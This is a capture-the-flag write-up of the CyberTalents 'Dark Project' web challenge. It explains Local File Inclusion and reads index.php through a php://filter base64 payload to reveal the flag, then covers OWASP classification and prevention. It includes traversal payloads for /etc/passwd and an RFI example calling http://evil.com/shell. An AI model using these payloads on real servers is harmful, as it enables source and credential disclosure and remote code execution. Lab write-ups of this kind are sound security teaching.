# Dark Project - CyberTalents

---

## Challenge Description
**What kind of Project are you seeking for?**

## Challenge Link
http://cdcamxwl32pue3e6m4m2360mtg301m236mnkmugv0-web.cybertalentslabs.com/

---

## 1. Initial Interface

The challenge is accessed via the CyberTalents platform, which displays the challenge title, description, and a link to launch the target web application.

<p align="center">
<img width="734" height="336" alt="image" src="https://github.com/user-attachments/assets/de4de056-ab2b-4ad8-bdd0-63ef0eab83b3" />
</p>

---

## 2. Challenge Page — Dark Project Website

Upon navigating to the challenge URL, a webpage called **Dark Project** is presented. It contains:

- A navigation bar with links: **Home, About, Projects, Contact**
- A welcome message describing a flood property project
- A suspicious section at the bottom saying:

> **"Try Harder — Wanna Buy Exploit..."**

This wording is an intentional hint from the challenge designer — it signals that the page is vulnerable to some form of exploitation.

<p align="center">
<img width="959" height="470" alt="image" src="https://github.com/user-attachments/assets/6c1ea2fd-a2bf-49e3-8fb7-0a8eb50400f4" />
</p>

---

## What is Local File Inclusion (LFI)?

**Local File Inclusion (LFI)** is a web vulnerability that occurs when an application uses user-supplied input to dynamically load files on the server — without properly validating what file is being requested.

### How It Works

When a web application loads pages dynamically using a URL parameter like:

```
index.php?home=about
index.php?home=contact
```

The backend PHP code is likely doing something like this:

```php
include($_GET['home'] . '.php');
```

The problem is that `$_GET['home']` is **user-controlled** — meaning anyone can change the value in the URL to something the developer never intended.

### What Can an Attacker Do With LFI?

| Attack | Example Payload | Goal |
|--------|----------------|------|
| Directory traversal | `?home=../../../../etc/passwd` | Read system files |
| PHP wrapper abuse | `?home=php://filter/convert.base64-encode/resource=index` | Read PHP source code |
| Log poisoning | Inject into server logs then include them | Remote code execution |

### LFI vs RFI

| | LFI (Local File Inclusion) | RFI (Remote File Inclusion) |
|---|---|---|
| **File source** | Files already on the server | Files hosted on an external URL |
| **Example** | `?home=../../../../etc/passwd` | `?home=http://evil.com/shell` |
| **Risk** | Read sensitive local files | Execute attacker-controlled code remotely |
| **More common?** | Yes | Less common — usually disabled by default in PHP |

### Why Is LFI Dangerous?

- Exposes **server-side source code** including hardcoded passwords and flags
- Can reveal **system files** like `/etc/passwd` containing user information
- In advanced cases can lead to **Remote Code Execution (RCE)** via log poisoning
- Bypasses the assumption that server-side code is hidden from users

---

## 3. Source Code Analysis — Identifying the Vulnerability Hint

Inspecting the page source in the browser reveals the HTML that the server sent back. The PHP code itself is **never visible** here — PHP runs on the server before sending the page, so the browser only sees the final HTML output.

However, two important clues are spotted in the source:

**Clue 1 — The navigation links use a `?home=` parameter:**

```html
<a href="index.php?home=about">About</a>
<a href="index.php?home=projects">Projects</a>
<a href="index.php?home=contact">Contact</a>
```

This pattern strongly suggests the server is using the `home` parameter to **dynamically load pages** — likely passing it into a PHP `include()` or `require()` function on the backend. This is a classic indicator of a potential **Local File Inclusion (LFI)** vulnerability.

**Clue 2 — The suspicious "Try Harder" message:**

```
Try Harder
Wanna Buy Exploit...
```

This is an intentional hint from the challenge designer — it tells us to look deeper and try exploit techniques beyond basic navigation.

<p align="center">
<img width="939" height="329" alt="image" src="https://github.com/user-attachments/assets/251d7cd2-b82c-4123-8826-3ee817ca2d7f" />
</p>

---

### Confirming the `?home=` Parameter via Burp Suite

To confirm how the `?home=` parameter is being handled, **Burp Suite** is used to intercept the HTTP traffic when clicking on any of the navigation links.

The intercepted request reveals a **GET** request with the `home` value passed directly in the URL:

```
GET /index.php?home=about HTTP/1.1
Host: [challenge-url]
```

<p align="center">
<img width="731" height="302" alt="image" src="https://github.com/user-attachments/assets/6a935190-6bf9-4d13-95df-176ad1dc3ed4" />
</p>

This is significant because it confirms:

| Observation | Why It Matters |
|-------------|---------------|
| The `home` value is in the **URL query string** | It is fully controlled by the user — anyone can change it to anything |
| It is sent as a **GET parameter** | No hidden form processing — the value goes straight to the server as-is |
| The server processes it to load a page | The backend is likely using `include()` with this value, making it an LFI target |

---

### Why Does the `?home=` Parameter Suggest LFI?

When a website uses a URL parameter to load different pages like `?home=about` or `?home=projects`, the backend PHP code is likely doing something like this behind the scenes:

```php
include($_GET['home'] . '.php');
```

This means whatever value is passed in `?home=` gets loaded as a file on the server. If the developer has **not properly validated** this input, an attacker can potentially:

- Try `?home=../../../../etc/passwd` to read system files (directory traversal)
- Try PHP wrappers like `php://filter` to read the server's own PHP source files

The first attempt using `../` directory traversal returned nothing — meaning the server likely has a basic filter against it. This leads to trying **PHP stream wrappers** instead.

---

## 4. PHP Wrappers & Filters — How the Exploit Works

### What is a PHP Wrapper?

PHP wrappers are built-in stream handlers that allow PHP to interact with different types of data sources. Instead of just reading a regular file, a wrapper lets you do things like encode, decode, or transform data while it is being read.

Common PHP wrappers:

| Wrapper | Purpose |
|---------|---------|
| `file://` | Read local files |
| `php://input` | Read raw POST data |
| `php://filter` | Apply transformations to a stream |
| `data://` | Embed raw data inline |

### What is `php://filter`?

`php://filter` is a special wrapper that allows you to apply a **filter** (transformation) to a file's content while reading it. Its syntax is:

```
php://filter/[filter]/resource=[filename]
```

### How Did We Know to Use `php://filter`?

This comes from a step by step reasoning process — not guessing:

| Step | Thought Process |
|------|----------------|
| See `?home=` in nav links | The server is loading files dynamically |
| Try `../` directory traversal | Returns nothing — basic filter is blocking it |
| Know PHP has stream wrappers | Research and CTF knowledge points to `php://filter` |
| Try `php://filter` | Not blocked by the server's weak filters |
| Use `convert.base64-encode` | So PHP encodes the file instead of executing it |
| Write `resource=index` | Contains the word `index` — passes the third filter check |

### Why Use `convert.base64-encode`?

When you try to directly include a `.php` file via LFI, PHP **executes** the file instead of showing its source code — so you see the output, not the raw code. By encoding the file as Base64 first, PHP cannot execute it — it treats it as a plain text string and outputs the encoded content instead.

The full payload used:

```
php://filter/convert.base64-encode/resource=index
```

This tells PHP:
1. Use the `php://filter` wrapper
2. Apply the `convert.base64-encode` filter to encode the content
3. Read the file `index` (the application will append `.php` automatically)

### How Does It Bypass the Server Filters?

| Filter | Blocks | Does the payload get blocked? |
|--------|--------|-------------------------------|
| Block `../` | Directory traversal | ❌ No `../` in the payload — **passes** |
| Block `php://input` | Only that specific wrapper | ❌ This uses `php://filter` not `php://input` — **passes** |
| Must contain `index` | Filename check | ✅ `resource=index` contains `index` — **passes** |

### The Full URL

```
http://[challenge-url]/index.php?home=php://filter/convert.base64-encode/resource=index
```

<p align="center">
<img width="721" height="32" alt="image" src="https://github.com/user-attachments/assets/d4c84203-8519-4893-b37f-51e10e95f0eb" />
</p>

The page now returns a **long Base64-encoded string** — the entire source code of `index.php` encoded:

<p align="center">
<img width="940" height="353" alt="image" src="https://github.com/user-attachments/assets/17149c48-1179-49d6-bc34-49fa7e9ddf03" />
</p>

---

## 5. Decoding via Burp Suite

The Base64 output is selected and sent to **Burp Suite's Decoder** tool for decoding. Burp Suite allows you to paste the encoded string and decode it directly from Base64 to reveal the raw PHP source code.

<p align="center">
<img width="893" height="397" alt="image" src="https://github.com/user-attachments/assets/233b515c-4c93-4a2d-b9a0-24719bbcfed5" />
</p>

<p align="center">
<img width="959" height="321" alt="image" src="https://github.com/user-attachments/assets/01c8aa2a-bf80-4c00-9183-890afb9cee4f" />
</p>

---

## 6. Decoding via Online Tool — Flag Obtained

The same Base64 string is also decoded using the online tool [https://www.base64decode.org/](https://www.base64decode.org/), which reveals the full PHP source code of `index.php`.

At the very top of the decoded source, the flag is hardcoded:

```
$flag = "{pHp_Wr4P3rs_4r3_Us3fuL}";
```

> **FLAG: `{pHp_Wr4P3rs_4r3_Us3fuL}`**

<p align="center">
<img width="545" height="258" alt="image" src="https://github.com/user-attachments/assets/0b87f789-83e1-4438-8376-2b773a6fc22f" />
</p>

---

# OWASP Classification

This vulnerability falls under:

> **OWASP Top 10: A03 — Injection / Local File Inclusion (LFI)**

Local File Inclusion occurs when an application uses unsanitised user input to dynamically include files on the server. When combined with PHP wrappers like `php://filter`, an attacker can read the raw source code of server-side files — including hardcoded secrets like flags, credentials, and API keys.

---

# Why This Is a Security Issue

The application passes the `?home=` URL parameter directly into PHP's `include()` function without properly validating or sanitising the input. This means:

- The three `preg_match()` filters are **bypassable** — `php://filter` is not blocked
- An attacker can use `php://filter` to **read any PHP file** on the server as Base64
- **Hardcoded secrets** like `$flag` in the source code become fully exposed
- The application leaks its own source code to any visitor who knows the right URL

---

# Exploitation Flow (OWASP A03 Mapping)

1. Attacker accesses the Dark Project webpage
2. Source code is inspected — `?home=` parameter in nav links spotted
3. Burp Suite confirms `home` value is sent as a GET parameter in the URL
4. Directory traversal `../` is attempted — blocked by server filter
5. `php://filter/convert.base64-encode/resource=index` is crafted as the payload
6. All three weak `preg_match()` filters are bypassed
7. PHP encodes `index.php` as Base64 instead of executing it
8. Long Base64 string is returned in the page output
9. String is decoded via Burp Suite Decoder or base64decode.org
10. Full PHP source code revealed — flag extracted: **`{pHp_Wr4P3rs_4r3_Us3fuL}`**

---

# Conclusion

This challenge demonstrates **Local File Inclusion (LFI)** via **PHP stream wrappers**. The `php://filter` wrapper is a powerful but often overlooked attack vector — it bypasses naive input filters that only block common patterns like `../` or `php://input`, while still allowing an attacker to read sensitive server-side files.

To prevent LFI vulnerabilities, applications should:
- **Never pass user input directly** into `include()`, `require()`, or similar functions
- Use a **whitelist approach** — only allow specific known filenames, never arbitrary input
- **Disable dangerous PHP wrappers** in `php.ini` if not needed (`allow_url_include = Off`)
- Apply proper **input validation** beyond simple pattern matching
